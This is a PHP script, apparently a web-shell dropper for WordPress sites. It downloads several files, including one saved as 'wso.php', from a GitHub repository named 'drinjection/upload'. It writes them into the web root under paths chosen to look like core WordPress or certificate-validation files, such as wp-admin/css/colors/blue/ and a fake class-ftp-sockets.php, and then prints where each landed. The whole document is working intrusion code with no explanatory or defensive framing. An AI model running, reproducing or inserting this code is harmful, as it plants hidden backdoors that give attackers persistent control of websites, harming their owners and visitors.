<?php
function http_get($url){
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/leaf.php" ;
$text = http_get('https://raw.githubusercontent.com/drinjection/upload/master/leaf.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else
  echo "not exits";
echo "done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/wso.php" ;
$text2 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/logs.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else
  echo "not exits2";
echo "done2 .\n " ;
$check3 = $_SERVER['DOCUMENT_ROOT'] . "/.well-known/pki-validation/u.php" ;
$text3 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/u.php');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
    echo $check3."</br>";
}else
  echo "not exits3";
echo "done3 .\n " ;
 
$check4 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/u.php" ;
$text4 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/u.php');
$open4 = fopen($check4, 'w');
fwrite($open4, $text4);
fclose($open4);
if(file_exists($check4)){
    echo $check4."</br>";
}else
  echo "not exits4";
echo "done4 .\n " ;

$check5 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/css/colors/blue/3xup.php" ;
$text5 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/3xup.php');
$open5 = fopen($check5, 'w');
fwrite($open5, $text5);
fclose($open5);
if(file_exists($check5)){
    echo $check5."</br>";
}else
  echo "not exits5";
echo "done5 .\n " ;

$check6 = $_SERVER['DOCUMENT_ROOT'] . "/wp-admin/includes/class-ftp-sockets.php" ;
$text6 = http_get('https://raw.githubusercontent.com/drinjection/upload/master/class-ftp-sockets.php');
$open6 = fopen($check6, 'w');
fwrite($open6, $text6);
fclose($open6);
if(file_exists($check6)){
    echo $check6."</br>";
}else
  echo "not exits6";
echo "done6 .\n " ;
 
?>
